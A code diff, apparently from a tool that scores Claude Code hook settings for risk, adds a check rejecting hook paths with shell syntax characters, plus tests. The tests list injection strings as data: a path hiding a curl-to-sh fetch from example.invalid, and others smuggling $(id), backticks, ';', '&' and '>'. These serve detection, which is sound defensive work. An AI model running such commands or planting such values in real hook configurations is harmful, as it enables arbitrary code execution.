@@ -55,6 +55,14 @@ pub(crate) fn is_installed_claude_hook_command(cmd: &str, run_dir: Option<&Path>
         },
         None => cmd.split_once(SHELL_WS).unwrap_or((cmd, "")),
     };
+    // The shell runs this command, so a path must hold nothing it reads as syntax.
+    // An unquoted path ends at the first space, so a space is only ever inside quotes.
+    let safe = |c: char| {
+        c.is_ascii_alphanumeric() || matches!(c, '/' | '\\' | ':' | '.' | '_' | '-') || c == ' '
+    };
+    if !exe.chars().all(safe) {
+        return false;
+    }
     let b = exe.as_bytes();
     let absolute = exe.starts_with(['/', '\\'])
         || (b.len() > 2
@@ -330,5 +338,44 @@ mod tests {
     fn a_group_with_no_handlers_is_still_scored() {
         let s = json!({ "hooks": { "PreToolUse": [{ "matcher": "*", "hooks": [] }] } });
         assert!(score(&reasons_of(&s, None)) >= 2.0);
+    }
+
+    #[test]
+    fn a_path_the_shell_would_read_as_syntax_is_still_scored() {
+        for cmd in [
+            "/opt/x;curl${IFS}example.invalid|sh;/lodeline-hook claude-code --capture redacted",
+            "/opt/$(id)/lodeline-hook claude-code --capture redacted",
+            "/opt/`id`/lodeline-hook claude-code --capture redacted",
+            r#""/opt/$(id)/lodeline-hook" claude-code --capture redacted"#,
+            r#""/opt/`id`/lodeline-hook" claude-code --capture redacted"#,
+            "/opt/a&b/lodeline-hook claude-code --capture redacted",
+            "/opt/a>b/lodeline-hook claude-code --capture redacted",
+            "/opt/~x/lodeline-hook claude-code --capture redacted",
+            "/opt/a*/lodeline-hook claude-code --capture redacted",
+            "/opt/a'b/lodeline-hook claude-code --capture redacted",
+            "/opt/\u{3042}/lodeline-hook claude-code --capture redacted",
+            "/opt/a\tb/lodeline-hook claude-code --capture redacted",
+            "/usr/local/bin/lodeline-hook claude-code --capture redacted;id",
+            "/usr/local/bin/lodeline-hook claude-code --capture redacted$(id)",
+        ] {
+            assert!(hook_score(&[cmd], None) >= 3.5, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_space_in_the_path_is_safe_only_inside_double_quotes() {
+        assert_eq!(
+            hook_score(
+                &[r#""/opt/My Tools/lodeline-hook" claude-code --capture redacted"#],
+                None
+            ),
+            0.0
+        );
+        assert!(
+            hook_score(
+                &["/opt/My Tools/lodeline-hook claude-code --capture redacted"],
+                None
+            ) >= 3.5
+        );
     }
 }
